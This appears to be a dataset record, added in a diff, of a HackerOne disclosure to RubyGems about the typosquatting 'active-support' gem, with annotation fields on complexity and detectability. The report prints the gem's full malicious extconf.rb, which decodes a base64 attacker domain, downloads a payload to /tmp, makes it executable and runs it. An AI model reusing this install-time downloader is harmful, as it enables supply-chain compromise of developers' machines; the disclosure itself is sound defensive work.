@@ -1,0 +1,45 @@
+{
+  "reported_to": "RubyGems",
+  "reported_by": "reed ",
+  "title": "Malware in `active-support` gem",
+  "content": "\nThis was sent to RubySec:\nThe gem duplicates official activesupport (no hyphen) code, but adds a compiled extension. The extension attempts to resolve a base64 encoded domain (29faea63.planfhntage.de), downloads a payload, and executes.\nactive-support-5.2.0.gem/data/ext/trellislike/unflaming/waffling/extconf.rb\nCode 742 Bytes\n1require 'net/http'\n2require 'uri'\n3require 'base64'\n4require 'resolv'\n5\n6class Smectis\n7  def self.install_explot(weighership)\n8    if !weighership.nil? and weighership != '0.0.0.0'\n9      educable = Net::HTTP.get_response(URI('http://' + weighership + '/mimming'))\n10      File.open('/tmp/autosymbiontic', 'wb+') do |uterometer|\n11        uterometer.binmode\n12        uterometer.write(educable.body)\n13        uterometer.chmod(0777)\n14        uterometer.close\n15      end\n16      system('/tmp/autosymbiontic')\n17    end\n18  end\n19\n20  def self.run()\n21    milligram = 'MjlmYWVhNjMucGxhbmZobnRhZ2UuZGU='\n22    jaunting = nil\n23    begin\n24      jaunting = Resolv.getaddress(Base64.decode64(milligram))\n25    rescue\n26    end\n27    self.install_exploit(jaunting)\n28  end\n29end\n30\n31Smectis.run()\nImpact\nRun arbitrary code on a victim's machine.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1533852840,
+  "report_url": "https://hackerone.com/reports/392311",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Install the malicious `active-support` gem (with a hyphen) instead of the legitimate `activesupport` gem."
+    ],
+    [
+      2,
+      "Run any Ruby code that requires the gem, triggering the embedded malicious code."
+    ]
+  ],
+  "vuln_description": "The `active-support` gem is a malicious copy of the legitimate `activesupport` gem, which includes a compiled extension that resolves a base64-encoded domain, downloads a payload, and executes it on the victim's machine.",
+  "reason": "The vulnerability is straightforward to discover once the malicious gem is identified, as the malicious code is directly embedded in the gem's source. The attack does not involve complex interactions or states, and the logic is not novel.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The malware in the `active-support` gem involves a malicious payload being downloaded and executed, which is not related to authentication or authorization vulnerabilities within an application. The proposed methodologies focus on detecting authN/authZ bugs by analyzing user sessions, actions, and resource IDs within the same application context, not on detecting malicious code execution in third-party libraries.",
+    "is_detectable": false
+  }
+}
